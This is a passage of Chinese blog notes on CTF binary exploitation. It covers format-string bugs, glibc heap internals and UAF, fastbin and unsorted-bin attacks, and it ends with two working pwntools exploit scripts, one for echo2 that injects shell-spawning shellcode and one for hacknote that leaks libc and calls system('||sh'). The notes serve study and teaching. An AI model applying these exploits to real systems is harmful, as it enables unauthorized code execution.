class="line">&#125;</span><br></pre></td></tr></table></figure><p>不给参数情况下 会直接将栈中内容进行打印</p><p>格式化字符串攻防中printf（”%s%s%s(足够长即可使得程序崩溃)”）</p><p><strong>字符串截断漏洞主体利用思想</strong>：</p><p> 截断符的篡改或抹去（让函数误解程序未执行完毕）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615225648504.png" alt="image-20230615225648504"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615225717582.png" alt="image-20230615225717582"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%p溢出---&gt;实际将栈上重要数据进行打印（如地址）可用于绕过canary</span><br><span class="line">%s溢出---&gt;解析栈打印其中内容 ---&gt;泄露任意地址</span><br><span class="line">泄露任意地址：</span><br><span class="line"><span class="number">1</span>.泄露栈上本身存在的地址（如<span class="keyword">read</span>@got）</span><br><span class="line"><span class="number">2</span>.泄露垃圾数据（篡改喽）再<span class="keyword">read</span>@got</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615232327380.png" alt="image-20230615232327380"></p><p>为避免flag和格式化字符串第一个参数距离很远直接传地址即可（printf（”%100$d”,a,b,c））</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616002416632.png" alt="image-20230616002416632"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> c = <span class="number">3</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%3$d&quot;</span>,a,b,c);<span class="comment">//打印出3  $n---&gt;打印出第几个参数</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>%d —-&gt;打印有符号整型  -140….对应0xf（要么为动态链接库中地址 要么为栈上地址）<br><img src="https://cdn.jsdelivr.net/gh/yub/First@main/image-20230616134523270.png" alt="image-20230616134523270"></p><p>逐参打印</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616134746197.png" alt="image-20230616134746197"></p><p>%n—-&gt;解析地址对应内容 —-写入前方已经打印成功的字符个数（任意地址写）<br>%n 写入4字节0x00000004<br>%hn写入两字节0x0004<br>%hhn写入一字节0x04<br>printf的第n+1个参数是格式化字符串的第n个参数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616162630147.png" alt="image-20230616162630147"></p><p>0x0b &#x3D; 11也可以说明为第十一个参数<br>空行部分相当于对填入数据的打印<br>关键：找read函数判断写入数据为格式化字符串第几个参数<br>x86可以直接数 x64前6个参数在寄存器中第7个才在栈上</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616170955472.png" alt="image-20230616170955472"></p><p>x64直接利用找参数位置 可暴力打印%7$p%8$p%9$p(仅为举例)<br>前6个参数在寄存器中 rsp为第7个—&gt;对应n+1printf（flag）和n格式化字符串关系找到位置</p><p><strong>堆</strong><br>作用：给用户随时提供可使用的内存 用完后归还</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616174226840.png" alt="image-20230616174226840"></p><p>堆管理器—&gt;中间人</p><p>堆管理器并非由操作系统实现,而是由libc.so.6链接库实现。封装了一些系统调用﹐为用户提供方便的动态内存分配接口的同时﹐力求高效地管理由系统调用申请来的内存。</p><p>申请内存系统调用：<br>brk（data段末尾向上扩展调用）主线程系统调用<br>mmap（内存&#x2F;磁盘映射）</p><p>决定要素：主线程brk和mmap都可用<br>                   子线程只可用mmap<br>子线程申请空间过大在mmap段映射 小可直接在data段开辟<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616175743170.png" alt="image-20230616175743170"></p><p>malloc用户向堆管理器要内存 brk和mmap向操作系统申请</p><p><strong>arena</strong>（将物理内存映射到虚拟内存空间存储管理）<br>内存分配区，可以理解为堆管理器所持有的内存池</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">操作系统</span><span class="literal">--</span>&gt;<span class="comment">堆管理器</span><span class="literal">--</span>&gt;<span class="comment">用户</span></span><br><span class="line"><span class="comment">物理内存</span><span class="literal">--</span>&gt;<span class="comment">arena</span><span class="literal">--</span>&gt;<span class="comment">可用内存</span></span><br></pre></td></tr></table></figure><p>堆管理器与用户的内存交易发生于arena中（堆管理器向操作系统批发来的有冗余的内存库）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618233511677.png" alt="image-20230618233511677"></p><p><strong>chunk</strong>（内存分配的最小单位 不可能小于8字节【两字长16字节（x64）】x32大小）<br>用户申请内存的单位，也是堆管理器管理内存的基本单位<br>malloc（）返回的指针指向一个chunk的数据区域 chunk大小 大于malloc分配大小<br>chunk分配规律：只能分配字长整数倍大小—&gt;size低三位一定为0</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617134142917.png" alt="image-20230617134142917"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617140647896.png" alt="image-20230617140647896"></p><p>free chunk<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617234752208.png" alt="image-20230617234752208"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617143930107.png" alt="image-20230617143930107"></p><p>注意在size低三位有三个控制字段<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230617145200469.png" alt="image-20230617145200469"></p><p>A：主线程 M：是否为mmap P：用于free chunk（为1–&gt;前一个chunk被写入数据即前一个chunk为malloc chunk 为0则前一个chunk为free chunk）1–&gt;前一个chunk被占用 0–&gt;前一个chunk pre-in-use</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617152524631.png" alt="image-20230617152524631"></p><p>fastbin free chunk 四字段控制结构 smallbin free chunk 四字段控制结构<br>bigbin free chunk 六字段控制结构</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617215936729.png" alt="image-20230617215936729"><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618233738837.png" alt="image-20230618233738837"></p><p>fast bins独立于其他几个bins 压栈出栈即可<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617235205771.png" alt="image-20230617235205771"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617235515996.png" alt="image-20230617235515996"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617220021172.png" alt="image-20230617220021172"></p><p>large bin free chunk 6个字段全部用到<br>malloc chunk 用前两个<br>malloc chunk前面还是malloc chunk时只用到第二个字段<br>small bin free chunk allocated chunk用前4个字段<br>fast bin free chunk 用前3个字段<br>经过第一次malloc后堆管理器才完成初始化<br>页对齐 页的大小是4kb 4kb需要2^12映射空间 12bits为3bytes变成3个0<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617222745908.png" alt="image-20230617222745908"></p><p>x64最下chunk单位（0x20大小）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617222844117.png" alt="image-20230617222844117"></p><p>x86 同理得最小大小为0x10（切一半）<br>控制字段不可填写 堆管理器满足用户需求向操作系统申请0x100大小实际申请chunk大小为0x110（pre size+size 两字长 16bits 0x10大小）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617223313606.png" alt="image-20230617223313606"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617225749420.png" alt="image-20230617225749420"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">void</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc得到的函数指针指向size （图中）但chunk开头的地址是</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617230144174.png" alt="image-20230617230144174"></p><p>其他chunk为程序自身利用缓冲区提供（如：printf函数 【未指定stdout缓冲区时 printf函数默认用malloc得到一个堆中的缓冲区为stdout所用】）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617231321789.png" alt="image-20230617231321789"></p><p>程序读取时以一条语句为单位 size大小为申请的0x100+prev size+size（两字长）此时p已被程序员复用 即此时总size大小（总chunk大小 0x100为malloc chunk大小）为0x111</p><p><strong>previous size复用</strong><br>prev size针对free chunk 即存储上一个free chunk<br>当上一个chunk不为fastbin free chunk时（为malloc chunk）prev chunk可被复用<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617233352292.png" alt="image-20230617233352292"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617233454554.png" alt="image-20230617233454554"></p><p>以上变化chunk变化相同 8字节申请的大小为字长奇数倍分配空间&#x3D;申请到的字长数-1malloc分配空间大小<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618105030445.png" alt="image-20230618105030445"></p><p>0x100数据区域的大小 0x10为控制字段的大小 1 prev in use 位大小</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618105235986.png" alt="image-20230618105235986"></p><p>放在fast bin 中的free chunk仍会被标记为在使用中（fast bin p位恒为1）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618105723997.png" alt="image-20230618105723997"></p><p><strong>物理链表</strong>【相邻chunk间size域连接（整数）】</p><p>通过prev size串联起来（获取前一个chunk地址）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617234705813.png" alt="image-20230617234705813"></p><p><strong>逻辑链表</strong>（存在于bins中）【指针连接】<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618111056657.png" alt="image-20230618111056657"></p><p>每一个bin都含有对应的链表 构成的bins链表称为逻辑链表<br>同类chunk串联到回收站中 malloc索取相应大小时可高效从回收站中提取</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618111551403.png" alt="image-20230618111551403"></p><p><strong>bin</strong><br>（临时【系统需要时可用】）保存刚被free后内存区域的结构（堆管理器中）<br>管理arena中空闲chunk的结构<br>以数组的形式存在 数组元素为相应大小的chunk链表的链表头<br>存在于arena的malloc_state中<br>如：<br>unsorted bin<br>fast bins<br>small bins<br>large bins<br> (tcache)<br><strong>除fast bin和tcache为单向链表 其余bins均为双向链表</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618230718261.png" alt="image-20230618230718261"><br>unsorted bin smallbin largebin双向链表结构bin利用:<br>🤖malloc分配时<br>🍰获取很大chunk时优先从回收站中拿取 unsorted bins变为sorted bins使用<br>双向链接：先进先出（图上自上而下malloc）<br>好处：队列底部压入数据 头部取出数据 一条链表就可处理数据<br>small bin（大小固定）<br>一个bin存储两个地址 物理内存中连续 把所有chunk串联</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235211411.png" alt="image-20230618235211411"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235427918.png" alt="image-20230618235427918"><br>large bins（大小不定【每一chunk大小不一】 最后一个chunk存储最后值）<br>大小为范围 —&gt;用两个额外的控制域记录数据<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235448673.png" alt="image-20230618235448673"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618234942479.png" alt="image-20230618234942479"></p><p>fast bins可变为small bins（fast bin整体遍历检查时分类）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235237538.png" alt="image-20230618235237538"></p><p>BK POINTER 域无实际作用<br>top chunk<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619151359619.png" alt="image-20230619151359619"></p><p> malloc state（fastbinsY+bins）在libc数据段管理主进程<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619120041795.png" alt="image-20230619120041795"></p><p><strong>什么样的chunk会进入usorted bins</strong><br>刚刚释放（超过fastbin大小）不能进入fastbins且未被分类的</p><p>超出fastbins可用大小利用过程：unsorted先乞讨 合并链接凑大小 small large一起来 实在不够喊top<br>先找sortedbins 不够触发sorted遍历 合并unsorted相邻chunk并分类<br>即利用时只要找到比用户申请大的chunk即可 剩余部分为last  remainder chunk转为fastbin部分最后进入unsorted bins</p><p><strong>UAF</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619160128310.png" alt="image-20230619160128310"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619160356676.png" alt="image-20230619160356676"></p><p>A free后的内存区</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619160410293.png" alt="image-20230619160410293"></p><p>在ree chunk和top chunk张放一个malloc chunk阻止两者合并（避免堆管理器的消耗）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619161430277.png" alt="image-20230619161430277"></p><p>c分配到a所在的内存区域中 占用利用</p><p>gdb偏移下断点方法</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">b</span> *<span class="variable">$rebase</span>(0x..)【偏移】</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193114872.png" alt="image-20230619193114872"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193556660.png" alt="image-20230619193556660"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619203856606.png" alt="image-20230619203856606"></p><p>第四次malloc后得到栈上地址（堆分配）</p><p>free a后<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193754379.png" alt="image-20230619193754379"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619194533056.png" alt="image-20230619194533056"></p><p>防止double free漏洞（UAF）：控制内存的指针和内存均需清空 （chunk被清空但指针未清空）<br>意外：低权限指针可因使用同一块内存区域拥有高权限指针功能（若低权限指针篡改返回值高权限指针会无意识传送到pie中）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> * p = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line"> <span class="built_in">free</span>(p);</span><br><span class="line"> <span class="built_in">free</span>(p);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619195914454.png" alt="image-20230619195914454"></p><p>tips：<br>1.glibc2.26&#x2F;2.27中无tache检查<br>2.fast bin会检查自身链表中每一个chunk大小是否为规定大小||新进入的chunk是否与上一个chunk重复（报double free 强制退出）</p><p>绕过：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span>* p = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line"> <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line"> <span class="type">int</span>* ptr = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line"> <span class="built_in">free</span>(p);</span><br><span class="line"> <span class="built_in">free</span>(ptr);</span><br><span class="line"> <span class="built_in">free</span>(p);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fastbin_attack<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619202854520.png" alt="image-20230619202854520"></p><p>free后fd出现 此时此块chunk对于d来说为malloc chunk可被任意写入值（fd处）<br>fd写入一个stack值 诈骗fast bin过a后下一个free chunk在栈上 【任意霍霍实现】</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619203751739.png" alt="image-20230619203751739"><br>注意：fd始终指向下一个chunk开头地址 即stack对应栈上目标地址向上两个字长</p><p><strong>unsorted_bin_attcak</strong><br>可以把任意位置的地址篡改成较大的值（实际就是伪造chunk在栈上写一个大数值）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619205339973.png" alt="image-20230619205339973"></p><p>程序目标将var篡改为较大值<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619205857320.png" alt="image-20230619205857320"></p><p>unlink移除中间的chunk  新fd和bk中填入unsorted bin中值（fd和bk数据域写入unsorted 地址）最大0x7ff…<br><strong>house_of系列</strong><br>malloc总是接收一个无符号整数 输入负数相当于传入一个超大数<br>整数溢出（超大整数等效于一个负数）<br>top chunk起始地址 + malloc分配空间超出整数内存空间大小–丢弃超出32位部分（最高位）补0 剩下数字变很小（32位表示空间大小）</p><p>此时这个很小的数很可能落在data处（？）</p><p><strong>FSB&amp;USF例题</strong><br>(1)IDA观察<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155645246.png" alt="image-20230620155645246"></p><p>scanf向v7、v8、v9写字符串（开辟的空间是连续的）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620161845271.png" alt="image-20230620161845271"></p><p>连续的三个字长缓冲区<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620162028689.png" alt="image-20230620162028689">发现程序标记提示进入对应漏洞查看<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155732238.png" alt="image-20230620155732238"></p><p>格式化字符串<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155800172.png" alt="image-20230620155800172"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155817628.png" alt="image-20230620155817628"></p><p>free（s）清空了内存但指针未销毁但随着echo3执行完毕对应s栈帧销毁故无影响 但 cleanup（）函数free（0）对应uaf 即o内存被清空但指针未被销毁 此时再用另一指针与o指向同一内存空间即可获取主动权</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620174531638.png" alt="    ">吗 </p><p>surprise<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620201633271.png" alt="image-20230620201633271"></p><p>echo3free后s使用的空间最后还是留在对应得4字长chunk中  o最后一个参数写入shellcode（greeting） 首地址作为参数进行传参</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./echo2&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./echo2&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;hey, what&#x27;s your name? : &quot;</span>)</span><br><span class="line">shellcode=<span class="string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;%10$p&quot;</span>+<span class="string">b&quot;A&quot;</span>*<span class="number">3</span> <span class="comment">#A用作标记</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">shellcode_addr=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;AAA&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;to exit? (y/n)&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;hello \n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*<span class="number">24</span>+p64(shellcode_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>hacknote（32位）</strong><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620231326851.png" alt="image-20230620231326851"></p><p>​                   <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620221606653.png" alt="image-20230620221606653"><br>add函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620221355683.png" alt="image-20230620221355683"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620220117301.png" alt="image-20230620220117301"></p><p>框住部分掌握控制信息 size对应的chunk可由用户自定义（uaf）control上未puts 下为sub</p><p>delete函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620222639346.png"></p><p>由下自上free两个chunk 但指针未被销毁 双free（uaf）<br>攻击第一步：<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620222239841.png" alt="image-20230620222239841"></p><p>malloc两次（写入垃圾数据的chunk+管理控制信息的chunk）</p><p>第二步<br>delete两个chunk 相同大小chunk进入同一fast bin self_puts第一个字长变为fd的第一个其他未变（包括指针）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620222903872.png"></p><p>malloc两次hou后<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620223247527.png" alt="image-20230620223247527"></p><p>传参用self_puts 地址  sub_chunk写入—&gt;puts_got<br>泄露</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620224148329.png" alt="image-20230620224148329"></p><p>print（0）对接远程的puts<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620230216527.png"></p><p>0此时保存的函数地址 获取0的地址进而利用两个chunk块<br>0中第一部分传入system地址（无可避免）用||（或）sh【前一条语句执行失败则执行sh】妙哉<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620230551936.png" alt="image-20230620230551936"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = remote(&quot;chall.pwnable.tw&quot;,10102)</span></span><br><span class="line">p=process(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">pfputs = <span class="number">0x804862b</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_note</span>(<span class="params">size,index</span>):</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;choice :&quot;</span>)</span><br><span class="line">      p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;size :&quot;</span>)</span><br><span class="line">      p.sendline(size)</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;Content :&quot;</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_note</span>(<span class="params">index</span>):</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;choice :&quot;</span>)</span><br><span class="line">      p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_note</span>(<span class="params">index</span>):</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;choice :&quot;</span>)</span><br><span class="line">      p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">add_note(<span class="string">b&quot;16&quot;</span>,<span class="string">b&quot;aaaaa&quot;</span>)</span><br><span class="line">add_note(<span class="string">b&quot;16&quot;</span>,<span class="string">b&quot;aaaaa&quot;</span>)</span><br><span class="line">delete_note(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">delete_note(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add_note(<span class="string">b&#x27;8&#x27;</span>,p32(pfputs)+p32(read_got))</span><br><span class="line">print_note(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pfread = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">pfsys = pfread - <span class="number">0xd41c0</span> + <span class="number">0x3a940</span></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">delete_note(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">add_note(<span class="string">b&#x27;8&#x27;</span>,p32(pfsys)+<span class="string">b&quot;||sh&quot;</span>)</span><br><span class="line">print_note(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn,知识碎片 </tag>
            
        </tags>
      
